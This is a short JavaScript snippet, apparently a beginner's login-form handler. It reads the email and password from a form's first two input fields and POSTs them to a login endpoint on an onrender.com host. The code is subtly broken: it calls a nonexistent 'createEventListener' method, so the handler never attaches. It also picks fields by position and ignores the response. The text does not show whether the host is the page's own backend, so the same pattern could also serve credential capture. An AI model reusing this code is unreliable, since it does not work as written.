const form = document.getElementById("login");

form.createEventListener("submit", function (e) {
	e.preventDefault();
	
	const inputs = document.getElementsByTagName("input");
	const email = inputs[0].value;
	const password = inputs[1].value;
	fetch("https://schibidi.onrender.com/login", {
		method: "POST",
		body: JSON.stringify({"email": email, "password": password}),
		headers: {
			"Content-Type": "application/json"
		}
	})
});